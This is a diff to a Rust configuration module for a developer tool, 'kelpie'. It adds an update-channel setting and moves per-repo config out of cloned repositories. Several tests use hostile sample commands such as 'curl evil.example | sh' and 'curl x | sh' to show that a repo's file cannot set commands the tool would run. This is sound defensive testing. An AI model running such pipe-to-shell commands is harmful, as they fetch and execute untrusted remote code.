@@ -32,9 +32,24 @@ impl Source {
     }
 }
 
+#[derive(Clone, Copy, Debug, Default, PartialEq)]
+pub enum Channel {
+    Main,
+    #[default]
+    Release,
+}
+
+impl Channel {
+    pub fn key(self) -> &'static str {
+        match self {
+            Channel::Main => "main",
+            Channel::Release => "release",
+        }
+    }
+}
+
 pub const DEFAULT_SETUP_SKILL: &str = "kelpie:set-up-worktree";
 pub const DEFAULT_RULES_SKILL: &str = "kelpie:work-rules";
-pub const REPO_FILE: &str = ".kelpie.toml";
 pub const DEFAULT_DEV_URL: &str = "http://localhost:{port}";
 pub const DEFAULT_SERVER_NAME: &str = "server";
 pub const DEFAULT_WORKER_NAME: &str = "worker";
@@ -58,6 +73,7 @@ pub struct Worktree {
 #[derive(Clone, Debug, Default, PartialEq)]
 pub struct Machine {
     pub sources: Option<Vec<Source>>,
+    pub channel: Option<Channel>,
     pub worktree: Worktree,
 }
 
@@ -71,7 +87,7 @@ pub enum Layer {
 impl Layer {
     pub fn label(self) -> &'static str {
         match self {
-            Layer::Repo => REPO_FILE,
+            Layer::Repo => "repo config",
             Layer::Machine => "machine config",
             Layer::Default => "default",
         }
@@ -98,6 +114,7 @@ pub struct Settings {
     pub vault_command: Setting<Option<String>>,
     pub server_name: Setting<String>,
     pub worker_name: Setting<String>,
+    pub channel: Setting<Channel>,
 }
 
 pub struct Loaded {
@@ -116,8 +133,26 @@ pub fn path() -> PathBuf {
     std::env::var("KELPIE_CONFIG").map(PathBuf::from).unwrap_or_else(|_| dir().join("config.toml"))
 }
 
-pub fn repo_file(repo: &Path) -> Option<PathBuf> {
-    main_checkout(repo).ok().map(|main| main.join(REPO_FILE))
+pub fn repos_dir() -> PathBuf {
+    std::env::var("KELPIE_REPOS_DIR").map(PathBuf::from).unwrap_or_else(|_| dir().join("repos"))
+}
+
+// A worktree shares its main checkout's file, since the file is named after the main checkout's folder.
+pub fn repo_file_in(dir: &Path, repo: &Path) -> PathBuf {
+    let main = main_checkout(repo).unwrap_or_else(|_| repo.to_path_buf());
+    dir.join(format!("{}.toml", name_of(&main)))
+}
+
+pub fn repo_file(repo: &Path) -> PathBuf {
+    repo_file_in(&repos_dir(), repo)
+}
+
+pub fn shown(path: &Path) -> String {
+    let found = if path.exists() { "found" } else { "not found" };
+    match std::fs::read_link(path) {
+        Ok(target) => format!("{} -> {} ({found})", path.display(), path.parent().map_or(target.clone(), |parent| parent.join(&target)).display()),
+        Err(_) => format!("{} ({found})", path.display()),
+    }
 }
 
 fn read(path: &Path) -> Result<Option<String>> {
@@ -152,7 +187,7 @@ fn strings(value: &Value, key: &str) -> Result<Vec<String>> {
     items.iter().map(|item| item.as_str().map(str::to_string).ok_or(format!("{key}: must be a list of strings"))).collect()
 }
 
-// A path a repo's file names stays inside the repo: relative, with no .. in it.
+// A path a repo config names stays inside the repo: relative, with no .. in it.
 pub fn inside(path: &str) -> bool {
     let path = Path::new(path);
     !path.as_os_str().is_empty() && path.components().all(|part| matches!(part, Component::Normal(_) | Component::CurDir))
@@ -257,6 +292,17 @@ fn board(table: &Table) -> Result<Option<Vec<Source>>> {
     backlog_sources(backlog)
 }
 
+fn update(table: &Table) -> Result<Option<Channel>> {
+    let Some(update) = subtable(table, "update", "update")? else { return Ok(None) };
+    unknown_keys(update, "update.", &["channel"])?;
+    match text(update, "channel", "update.channel")?.as_deref() {
+        None => Ok(None),
+        Some("main") => Ok(Some(Channel::Main)),
+        Some("release") => Ok(Some(Channel::Release)),
+        Some(other) => Err(format!("update.channel: \"{other}\" is not a channel; use \"main\" or \"release\"")),
+    }
+}
+
 fn worktree(table: &Table) -> Result<Worktree> {
     let Some(worktree) = subtable(table, "worktree", "worktree")? else { return Ok(Worktree::default()) };
     unknown_keys(worktree, "worktree.", &["setup_skill", "setup_command", "dev_server", "dev_worker", "dev_url", "server_name", "worker_name"])?;
@@ -318,25 +364,26 @@ fn table(text: &str, source: &str) -> Result<Table> {
 pub fn parse_machine(text: &str, source: &str) -> Result<Machine> {
     let table = table(text, source)?;
     let fail = |error: String| format!("{source}: {error}");
-    unknown_keys(&table, "", &["board", "worktree", "task", "review", "notify", "vault"]).map_err(fail)?;
+    unknown_keys(&table, "", &["board", "worktree", "task", "review", "notify", "vault", "update"]).map_err(fail)?;
     let worktree = layers(&table).map_err(fail)?;
-    Ok(Machine { sources: board(&table).map_err(fail)?, worktree })
+    Ok(Machine { sources: board(&table).map_err(fail)?, channel: update(&table).map_err(fail)?, worktree })
 }
+
+const MACHINE_WIDE: &str = "applies to every repo, so it lives in config.toml";
 
 // The [[actions]] are actions.rs's to check.
 pub fn parse_repo(text: &str, source: &str) -> Result<Worktree> {
     let table = table(text, source)?;
     let fail = |error: String| format!("{source}: {error}");
-    if table.contains_key("notify") {
-        return Err(fail(format!("notify: machine config only, since a cloned repo's file would run its command on every report; set [notify] command in {}", path().display())));
-    }
-    if table.contains_key("vault") {
-        return Err(fail(format!("vault: machine config only, since a cloned repo's file would choose the command kelpie writes your vault with; set [vault] command in {}", path().display())));
+    for (key, setting) in [("board", "[board.backlog] sources"), ("notify", "[notify] command"), ("update", "[update] channel"), ("vault", "[vault] command")] {
+        if table.contains_key(key) {
+            return Err(fail(format!("{key}: {MACHINE_WIDE}; set {setting} in {}", path().display())));
+        }
     }
     unknown_keys(&table, "", &["actions", "worktree", "task", "review"]).map_err(fail)?;
     let worktree = layers(&table).map_err(fail)?;
     if worktree.server_name.is_some() || worktree.worker_name.is_some() {
-        return Err(fail(format!("worktree.server_name and worker_name: machine config only, since the sidebar names every Space's server and worker alike; set them in {}", path().display())));
+        return Err(fail(format!("worktree.server_name and worker_name: {MACHINE_WIDE}, since the sidebar names every Space's server and worker alike; set them in {}", path().display())));
     }
     Ok(worktree)
 }
@@ -369,6 +416,7 @@ pub fn settings(repo: &Worktree, machine: &Machine) -> Settings {
         vault_command: optional(pick(None, machine.worktree.vault_command.as_ref())),
         server_name: or_default(pick(None, machine.worktree.server_name.as_ref()), DEFAULT_SERVER_NAME.to_string()),
         worker_name: or_default(pick(None, machine.worktree.worker_name.as_ref()), DEFAULT_WORKER_NAME.to_string()),
+        channel: or_default(pick(None, machine.channel.as_ref()), Channel::default()),
     }
 }
 
@@ -380,41 +428,9 @@ pub fn setup_command_in(command: Option<String>, repo: &Path) -> Option<String> 
     })
 }
 
-fn confirmed_file(state: &Path, repo: &Path, command: &str) -> PathBuf {
-    let repo = repo.canonicalize().unwrap_or_else(|_| repo.to_path_buf());
-    let seed = format!("{}\0{command}", repo.display());
-    state.join("confirmed-commands").join(sha1_smol::Sha1::from(seed).digest().to_string())
-}
-
-pub fn confirm_command_in(state: &Path, repo: &Path, command: &str) -> Result<()> {
-    crate::state::write(&confirmed_file(state, repo, command), "")
-}
-
-// A command from the repo's own file, until the user confirms that exact text for that repo; the machine config's commands are the user's own.
-pub fn unconfirmed_in(state: &Path, setting: &Setting<Option<String>>, repo: &Path) -> Option<String> {
-    let command = setting.value.as_ref()?;
-    (setting.layer == Layer::Repo && !confirmed_file(state, repo, command).exists()).then(|| command.clone())
-}
-
-pub fn unconfirmed(setting: &Setting<Option<String>>, repo: &Path) -> Option<String> {
-    match crate::lead::state_location() {
-        Ok(state) => unconfirmed_in(&state, setting, repo),
-        Err(_) => setting.value.clone().filter(|_| setting.layer == Layer::Repo),
-    }
-}
-
-pub fn confirm_command(repo: &Path, command: &str) -> Result<()> {
-    confirm_command_in(&crate::lead::state_dir()?, repo, command)
-}
-
-// The command a task or the board may run: unset when the repo's file names one the user has not confirmed.
-pub fn trusted(setting: &Setting<Option<String>>, repo: &Path) -> Option<String> {
-    setting.value.clone().filter(|_| unconfirmed(setting, repo).is_none())
-}
-
 pub fn resolve(repo: Option<&Path>) -> Result<Loaded> {
     let machine = path();
-    let repo = repo.and_then(repo_file);
+    let repo = repo.map(repo_file);
     let own = repo.as_deref().map(load_repo).transpose()?.unwrap_or_default();
     Ok(Loaded { settings: settings(&own, &load_machine(&machine)?), machine, repo })
 }
@@ -423,25 +439,27 @@ pub fn sources() -> Result<Vec<Source>> {
     Ok(resolve(None)?.settings.sources.value)
 }
 
+pub fn channel() -> Result<Channel> {
+    Ok(load_machine(&path())?.channel.unwrap_or_default())
+}
+
 fn quoted(items: &[&str]) -> String {
     format!("[{}]", items.iter().map(|item| format!("{item:?}")).collect::<Vec<_>>().join(", "))
 }
 
-fn found(path: &Path) -> &'static str {
-    if path.exists() { "found" } else { "not found" }
-}
-
 pub fn describe(loaded: &Loaded) -> String {
-    let Settings { sources, setup_skill, setup_command, dev_server, dev_worker, dev_url, rules_skill, review_model, notify_command, vault_command, server_name, worker_name } = &loaded.settings;
+    let Settings { sources, setup_skill, setup_command, dev_server, dev_worker, dev_url, rules_skill, review_model, notify_command, vault_command, server_name, worker_name, channel } = &loaded.settings;
     let repo = match &loaded.repo {
-        Some(path) => format!("{} ({})", path.display(), found(path)),
+        Some(path) => shown(path),
         None => "none: not in a git repo (--repo <path> names one)".to_string(),
     };
     let mut lines: Vec<String> = [
-        (REPO_FILE, repo),
-        ("machine config", format!("{} ({})", loaded.machine.display(), found(&loaded.machine))),
+        ("repo config", repo),
+        ("machine config", shown(&loaded.machine)),
         ("defaults", "built in".to_string()),
     ].into_iter().map(|(layer, file)| format!("{:<16}{file}", format!("{layer}:"))).collect();
+    lines.push(String::new());
+    lines.push(format!("Each key below may be set in config.toml or, for one repo, in {}/<repo>.toml (named after the main checkout's folder), which wins; a key marked config.toml only applies to every repo.", repos_dir().display()));
     lines.push(String::new());
     let names: Vec<&str> = sources.value.iter().map(|source| source.key()).collect();
     let mut key = |name: &str, value: String, layer: Layer, about: &str| {
@@ -449,7 +467,7 @@ pub fn describe(loaded: &Loaded) -> String {
         lines.push(format!("  {about}"));
     };
     key("board.backlog.sources", quoted(&names), sources.layer,
-        "Where the board's Backlog tab finds work: \"local\" (backlog.md next to the machine config), \"vault\" and \"linear\", in any combination; machine config only.");
+        "Where the board's Backlog tab finds work: \"local\" (backlog.md next to the machine config), \"vault\" and \"linear\", in any combination; config.toml only.");
     key("worktree.setup_skill", format!("{:?}", setup_skill.value), setup_skill.layer,
         "The skill a task's Claude runs first to make its worktree runnable.");
     key("worktree.setup_command", setup_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), setup_command.layer,
@@ -461,17 +479,20 @@ pub fn describe(loaded: &Loaded) -> String {
     key("worktree.dev_url", dev_url.value.as_ref().map_or("\"\" (no link)".to_string(), |url| format!("{url:?}")), dev_url.layer,
         "The running dev server's address, shown on the board as a link: {worktree} (the worktree's folder), {repo}, {number} (its pool number) and {port} (its port) are filled in; a worktree without what it names gets no link, and \"\" turns the link off.");
     key("worktree.server_name", format!("{:?}", server_name.value), server_name.layer,
-        "The name of the tab the board's w starts the dev server in, and of the Space's tag in herdr's sidebar while it runs; machine config only.");
+        "The name of the tab the board's w starts the dev server in, and of the Space's tag in herdr's sidebar while it runs; config.toml only.");
     key("worktree.worker_name", format!("{:?}", worker_name.value), worker_name.layer,
-        "The same for the worker tab b starts; machine config only.");
+        "The same for the worker tab b starts; config.toml only.");
     key("task.rules_skill", format!("{:?}", rules_skill.value), rules_skill.layer,
         "The skill with the rules for how work is planned, built and committed; a task's Claude follows it, the lead checks a finished task against it, tidy reshapes commits by it.");
     key("review.model", review_model.value.as_ref().map_or("none".to_string(), |model| format!("{model:?}")), review_model.layer,
         "The model kelpie review's independent reviewer runs on; none leaves it to Claude's default.");
     key("notify.command", notify_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), notify_command.layer,
-        "The shell command kelpie runs when something needs you (a task needs you or is ready, a question waits, the lead's summary); KELPIE_EVENT, KELPIE_TASK, KELPIE_REPO and KELPIE_TEXT describe it, and $1 is the text. None sends no notifications; machine config only.");
+        "The shell command kelpie runs when something needs you (a task needs you or is ready, a question waits, the lead's summary); KELPIE_EVENT, KELPIE_TASK, KELPIE_REPO and KELPIE_TEXT describe it, and $1 is the text. None sends no notifications; config.toml only.");
     key("vault.command", vault_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), vault_command.layer,
-        "The notes-vault-mcp command kelpie writes task notes and log lines with, before its own arguments (task open, log append, ...); none runs the vault plugin's own pinned command from its hooks. Used only while the vault plugin is installed and enabled; machine config only.");
+        "The notes-vault-mcp command kelpie writes task notes and log lines with, before its own arguments (task open, log append, ...); none runs the vault plugin's own pinned command from its hooks. Used only while the vault plugin is installed and enabled; config.toml only.");
+    key("update.channel", format!("{:?}", channel.value.key()), channel.layer,
+        "What kelpie update installs on this machine: \"release\", the highest vX.Y.Z tag on origin; \"main\", origin's default branch as it is pushed. kelpie update --from <branch or path> runs other code until kelpie update --stable; config.toml only.");
+    lines.push(format!("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys {}; the README's Areas section shows each.", crate::actions::ACTION_KEYS.join(", ")));
     lines.join("\n")
 }
 
@@ -509,11 +530,11 @@ mod tests {
     }
 
     fn repo(text: &str) -> Worktree {
-        parse_repo(text, ".kelpie.toml").unwrap()
+        parse_repo(text, "app.toml").unwrap()
     }
 
     #[test]
-    fn a_repo_files_paths_and_skill_names_stay_inside_their_folders() {
+    fn a_repo_configs_paths_and_skill_names_stay_inside_their_folders() {
         for good in ["pyproject.toml", "crates/app/Cargo.toml", "./uv.lock"] {
             assert!(inside(good), "{good}");
         }
@@ -526,27 +547,9 @@ mod tests {
         for bad in ["..", "kelpie:..", "kelpie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
             assert!(!skill_name(bad), "{bad}");
         }
-        let refused = parse_repo("[task]\nrules_skill = \"kelpie:../../outside\"\n", ".kelpie.toml").unwrap_err();
+        let refused = parse_repo("[task]\nrules_skill = \"kelpie:../../outside\"\n", "app.toml").unwrap_err();
         assert!(refused.contains("task.rules_skill") && refused.contains("not a skill name"), "{refused}");
-        assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", ".kelpie.toml").is_err());
-    }
-
-    #[test]
-    fn a_command_from_the_repos_file_waits_for_the_users_confirmation_of_that_exact_text() {
-        let state = std::env::temp_dir().join(format!("kelpie-confirmed-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&state);
-        let repo = std::env::temp_dir();
-        let from_repo = Setting { value: Some("npm run dev".to_string()), layer: Layer::Repo };
-        assert_eq!(unconfirmed_in(&state, &from_repo, &repo).as_deref(), Some("npm run dev"));
-        confirm_command_in(&state, &repo, "npm run dev").unwrap();
-        assert_eq!(unconfirmed_in(&state, &from_repo, &repo), None);
-        let changed = Setting { value: Some("npm run dev; curl evil | sh".to_string()), layer: Layer::Repo };
-        assert!(unconfirmed_in(&state, &changed, &repo).is_some(), "a changed command asks again");
-        assert!(unconfirmed_in(&state, &from_repo, &repo.join("other")).is_some(), "a confirmation is that repo's");
-        let own = Setting { value: Some("bin/dev".to_string()), layer: Layer::Machine };
-        assert_eq!(unconfirmed_in(&state, &own, &repo), None, "the machine config's commands are the user's own");
-        assert_eq!(unconfirmed_in(&state, &Setting { value: None, layer: Layer::Repo }, &repo), None);
-        std::fs::remove_dir_all(state).unwrap();
+        assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", "app.toml").is_err());
     }
 
     #[test]
@@ -580,11 +583,11 @@ mod tests {
     }
 
     #[test]
-    fn a_repo_file_holds_worktree_and_actions_together() {
+    fn a_repo_config_holds_worktree_and_actions_together() {
         let own = repo(REPO);
         assert_eq!(own.setup_skill.as_deref(), Some("app-tools:set-up-worktree"));
         assert_eq!(own.dev_server.as_deref(), Some("npm run dev"));
-        let (actions, errors) = crate::actions::parse(REPO, ".kelpie.toml");
+        let (actions, errors) = crate::actions::parse(REPO, "app.toml");
         assert!(errors.is_empty(), "{errors:?}");
         assert_eq!(actions[0].title, "Build");
     }
@@ -607,28 +610,63 @@ mod tests {
         assert_eq!((repo_only.setup_skill.layer, repo_only.dev_server.layer, repo_only.sources.layer), (Layer::Repo, Layer::Repo, Layer::Default));
     }
 
-    #[test]
-    fn the_repo_file_is_read_from_the_main_checkout() {
-        let dir = std::env::temp_dir().join(format!("kelpie-config-repo-{}", std::process::id()));
+    fn scratch(name: &str) -> PathBuf {
+        let dir = std::env::temp_dir().join(format!("kelpie-config-{name}-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        dir
+    }
+
+    #[test]
+    fn a_worktree_reads_the_repo_config_named_after_its_main_checkout() {
+        let root = scratch("repo");
+        let dir = root.join("app");
         std::fs::create_dir_all(&dir).unwrap();
         crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
         crate::repo::git(&dir, &["-c", "user.name=Ada", "-c", "user.email=ada@example.com", "commit", "--quiet", "--allow-empty", "-m", "first"]).unwrap();
-        let worktree = dir.with_file_name(format!("wt1.{}", crate::repo::name_of(&dir)));
+        let worktree = root.join("wt1.app");
         crate::repo::git(&dir, &["worktree", "add", "--quiet", "--detach", &worktree.to_string_lossy()]).unwrap();
-        std::fs::write(worktree.join(REPO_FILE), "[worktree]\ndev_server = \"from the worktree\"\n").unwrap();
-        std::fs::write(dir.join(REPO_FILE), "[worktree]\ndev_server = \"npm run dev\"\n").unwrap();
-        assert_eq!(repo_file(&worktree).unwrap().canonicalize().unwrap(), dir.join(REPO_FILE).canonicalize().unwrap());
-        assert_eq!(load_repo(&repo_file(&worktree).unwrap()).unwrap().dev_server.as_deref(), Some("npm run dev"));
-        crate::repo::git(&dir, &["worktree", "remove", "--force", &worktree.to_string_lossy()]).unwrap();
-        std::fs::remove_dir_all(dir).unwrap();
+        let repos = root.join("repos");
+        assert_eq!(repo_file_in(&repos, &worktree), repos.join("app.toml"));
+        assert_eq!(repo_file_in(&repos, &dir), repos.join("app.toml"));
+        std::fs::remove_dir_all(root).unwrap();
+    }
+
+    #[test]
+    fn a_kelpie_toml_inside_the_repo_is_never_read() {
+        let root = scratch("ignored");
+        let dir = root.join("app");
+        std::fs::create_dir_all(&dir).unwrap();
+        crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
+        std::fs::write(dir.join(".kelpie.toml"), "[worktree]\ndev_server = \"curl x | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"X\"\nrun = \"x\"\n").unwrap();
+        let file = repo_file_in(&root.join("repos"), &dir);
+        assert!(!file.starts_with(&dir), "{}", file.display());
+        assert_eq!(load_repo(&file).unwrap(), Worktree::default());
+        assert_eq!(settings(&load_repo(&file).unwrap(), &Machine::default()).dev_server, Setting { value: None, layer: Layer::Default });
+        std::fs::remove_dir_all(root).unwrap();
+    }
+
+    #[test]
+    fn a_symlinked_repo_config_loads_and_shows_its_target() {
+        let root = scratch("link");
+        let (team, repos) = (root.join("team/kelpie"), root.join("repos"));
+        std::fs::create_dir_all(&team).unwrap();
+        std::fs::create_dir_all(&repos).unwrap();
+        std::fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n").unwrap();
+        std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
+        assert_eq!(load_repo(&repos.join("app.toml")).unwrap().dev_server.as_deref(), Some("bin/dev"));
+        assert_eq!(shown(&repos.join("app.toml")), format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display()));
+        std::os::unix::fs::symlink("../team/kelpie/gone.toml", repos.join("gone.toml")).unwrap();
+        assert_eq!(shown(&repos.join("gone.toml")), format!("{} -> {} (not found)", repos.join("gone.toml").display(), repos.join("../team/kelpie/gone.toml").display()));
+        assert_eq!(shown(&repos.join("none.toml")), format!("{} (not found)", repos.join("none.toml").display()));
+        std::fs::remove_dir_all(root).unwrap();
     }
 
     #[test]
     fn unknown_keys_and_bad_values_name_the_file_and_the_key() {
         let error = |text: &str| parse_machine(text, "/home/u/.config/kelpie/config.toml").unwrap_err();
-        assert_eq!(error("colour = 1\n"), "/home/u/.config/kelpie/config.toml: colour: unknown key; known keys here: board, worktree, task, review, notify, vault");
-        assert_eq!(error("[backlog]\nsources = []\n"), "/home/u/.config/kelpie/config.toml: backlog: unknown key; known keys here: board, worktree, task, review, notify, vault");
+        assert_eq!(error("colour = 1\n"), "/home/u/.config/kelpie/config.toml: colour: unknown key; known keys here: board, worktree, task, review, notify, vault, update");
+        assert_eq!(error("[backlog]\nsources = []\n"), "/home/u/.config/kelpie/config.toml: backlog: unknown key; known keys here: board, worktree, task, review, notify, vault, update");
         assert_eq!(error("[board.backlog]\nsource = []\n"), "/home/u/.config/kelpie/config.toml: board.backlog.source: unknown key; known keys here: sources");
         assert_eq!(error("[board.backlog]\nsources = [\"jira\"]\n"), "/home/u/.config/kelpie/config.toml: board.backlog.sources: \"jira\" is not a source; use \"local\", \"vault\" or \"linear\"");
         assert!(error("[board.backlog]\nsources = \"vault\"\n").contains("board.backlog.sources: must be a list of strings"));
@@ -638,9 +676,10 @@ mod tests {
         assert!(error("[worktree]\ndev_server = [\"bin/dev\"]\n").contains("worktree.dev_server: must be a string"));
         assert!(error("[worktree]\nsetup_skill = \" \"\n").contains("worktree.setup_skill: must not be empty"));
         assert!(error("not toml [").starts_with("/home/u/.config/kelpie/config.toml: TOML parse error"));
-        let repo_error = |text: &str| parse_repo(text, "/src/app/.kelpie.toml").unwrap_err();
-        assert_eq!(repo_error("[board.backlog]\nsources = []\n"), "/src/app/.kelpie.toml: board: unknown key; known keys here: actions, worktree, task, review");
-        assert_eq!(repo_error("[worktree]\nport = 3000\n"), "/src/app/.kelpie.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, server_name, worker_name");
+        let repo_error = |text: &str| parse_repo(text, "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
+        assert!(repo_error("[board.backlog]\nsources = []\n").starts_with("/home/u/.config/kelpie/repos/app.toml: board: applies to every repo, so it lives in config.toml; set [board.backlog] sources in "));
+        assert_eq!(repo_error("colour = 1\n"), "/home/u/.config/kelpie/repos/app.toml: colour: unknown key; known keys here: actions, worktree, task, review");
+        assert_eq!(repo_error("[worktree]\nport = 3000\n"), "/home/u/.config/kelpie/repos/app.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, server_name, worker_name");
     }
 
     #[test]
@@ -649,10 +688,10 @@ mod tests {
         assert_eq!(settings(&Worktree::default(), &from_machine).review_model, Setting { value: Some("opus".to_string()), layer: Layer::Machine });
         let both = settings(&repo("[review]\nmodel = \"sonnet\"\n"), &from_machine);
         assert_eq!(both.review_model, Setting { value: Some("sonnet".to_string()), layer: Layer::Repo });
-        assert!(parse_repo("[review]\nmodle = \"opus\"\n", ".kelpie.toml").unwrap_err().contains("review.modle: unknown key; known keys here: model"));
+        assert!(parse_repo("[review]\nmodle = \"opus\"\n", "app.toml").unwrap_err().contains("review.modle: unknown key; known keys here: model"));
         assert!(parse_machine("[review]\nmodel = \"\"\n", "config.toml").unwrap_err().contains("review.model: must not be empty"));
         let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both };
-        assert!(describe(&loaded).contains("review.model = \"sonnet\"  (.kelpie.toml)"));
+        assert!(describe(&loaded).contains("review.model = \"sonnet\"  (repo config)"));
         let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
         assert!(describe(&default).contains("review.model = none  (default)\n  The model kelpie review"));
     }
@@ -661,9 +700,9 @@ mod tests {
     fn the_notify_command_is_machine_config_only() {
         let from_machine = machine("[notify]\ncommand = \"curl -d \\\"$KELPIE_TEXT\\\" ntfy.sh/mine\"\n");
         assert_eq!(settings(&Worktree::default(), &from_machine).notify_command, Setting { value: Some("curl -d \"$KELPIE_TEXT\" ntfy.sh/mine".to_string()), layer: Layer::Machine });
-        let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/src/app/.kelpie.toml").unwrap_err();
-        assert!(refused.starts_with("/src/app/.kelpie.toml: notify: machine config only"), "a cloned repo's .kelpie.toml never runs a command on every report: {refused}");
-        assert!(parse_repo("[notify]\n", ".kelpie.toml").unwrap_err().contains("machine config only"));
+        let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
+        assert!(refused.starts_with("/home/u/.config/kelpie/repos/app.toml: notify: applies to every repo, so it lives in config.toml"), "{refused}");
+        assert!(parse_repo("[notify]\n", "app.toml").unwrap_err().contains("lives in config.toml"));
         let sneaked = Worktree { notify_command: Some("bin/notify".to_string()), ..Worktree::default() };
         assert_eq!(settings(&sneaked, &from_machine).notify_command.layer, Layer::Machine, "the repo layer is never read for it");
         assert!(parse_machine("[notify]\ncmd = \"x\"\n", "config.toml").unwrap_err().contains("notify.cmd: unknown key; known keys here: command"));
@@ -674,14 +713,31 @@ mod tests {
         assert!(describe(&loaded).contains("notify.command = \"curl -d \\\"$KELPIE_TEXT\\\" ntfy.sh/mine\"  (machine config)"));
         let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
         assert!(describe(&default).contains("notify.command = none  (default)\n  The shell command kelpie runs"));
-        assert!(describe(&default).contains("machine config only."));
+        assert!(describe(&default).contains("config.toml only."));
+    }
+
+    #[test]
+    fn the_update_channel_is_release_unless_the_machine_config_says_main() {
+        assert_eq!(settings(&Worktree::default(), &Machine::default()).channel, Setting { value: Channel::Release, layer: Layer::Default });
+        assert_eq!(settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")).channel, Setting { value: Channel::Main, layer: Layer::Machine });
+        assert_eq!(machine("[update]\nchannel = \"release\"\n").channel, Some(Channel::Release));
+        assert_eq!(machine("[update]\n").channel, None);
+        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
+        assert!(error("[update]\nchannel = \"stable\"\n").contains("update.channel: \"stable\" is not a channel; use \"main\" or \"release\""));
+        assert!(error("[update]\nchanel = \"main\"\n").contains("update.chanel: unknown key; known keys here: channel"));
+        assert!(error("[update]\nchannel = 1\n").contains("update.channel: must be a string"));
+        assert!(parse_repo("[update]\nchannel = \"main\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kelpie/repos/app.toml: update: applies to every repo"));
+        let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
+        assert!(default.contains("update.channel = \"release\"  (default)\n  What kelpie update installs"), "{default}");
+        let main = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")) });
+        assert!(main.contains("update.channel = \"main\"  (machine config)"), "{main}");
     }
 
     #[test]
     fn the_vault_command_is_machine_config_only() {
         let from_machine = machine("[vault]\ncommand = \"uv run --project ~/src/notes-vault-mcp notes-vault-mcp\"\n");
         assert_eq!(settings(&Worktree::default(), &from_machine).vault_command, Setting { value: Some("uv run --project ~/src/notes-vault-mcp notes-vault-mcp".to_string()), layer: Layer::Machine });
-        assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/src/app/.kelpie.toml").unwrap_err().starts_with("/src/app/.kelpie.toml: vault: machine config only"));
+        assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kelpie/repos/app.toml: vault: applies to every repo"));
         assert!(parse_machine("[vault]\ncmd = \"x\"\n", "config.toml").unwrap_err().contains("vault.cmd: unknown key; known keys here: command"));
         let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
         assert!(describe(&default).contains("vault.command = none  (default)\n  The notes-vault-mcp command"), "{}", describe(&default));
@@ -689,9 +745,10 @@ mod tests {
 
     #[test]
     fn describe_names_each_value_and_its_layer() {
-        let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/src/app/.kelpie.toml")), settings: settings(&own, &machine) };
+        let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/home/u/.config/kelpie/repos/app.toml")), settings: settings(&own, &machine) };
         let shown = describe(&loaded(Worktree::default(), Machine::default()));
-        assert!(shown.contains("/src/app/.kelpie.toml (not found)"), "{shown}");
+        assert!(shown.contains("repo config:    /home/u/.config/kelpie/repos/app.toml (not found)"), "{shown}");
+        assert!(shown.contains("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys id, key, title,"), "{shown}");
         assert!(shown.contains("machine config: /c.toml (not found)"));
         assert!(shown.contains("board.backlog.sources = [\"local\"]  (default)\n  Where the board's Backlog tab finds work"));
         assert!(shown.contains("worktree.setup_skill = \"kelpie:set-up-worktree\"  (default)"));
@@ -699,7 +756,7 @@ mod tests {
         let shown = describe(&loaded(repo("[worktree]\ndev_server = \"npm run dev\"\n"), machine(MACHINE)));
         assert!(shown.contains("board.backlog.sources = [\"vault\", \"linear\"]  (machine config)"));
         assert!(shown.contains("worktree.setup_skill = \"my-tools:set-up-worktree\"  (machine config)"));
-        assert!(shown.contains("worktree.dev_server = \"npm run dev\"  (.kelpie.toml)"));
+        assert!(shown.contains("worktree.dev_server = \"npm run dev\"  (repo config)"));
         let outside = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
         assert!(describe(&outside).contains("none: not in a git repo"));
     }
@@ -746,13 +803,13 @@ mod tests {
         assert_eq!(dev_url(off.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")), None);
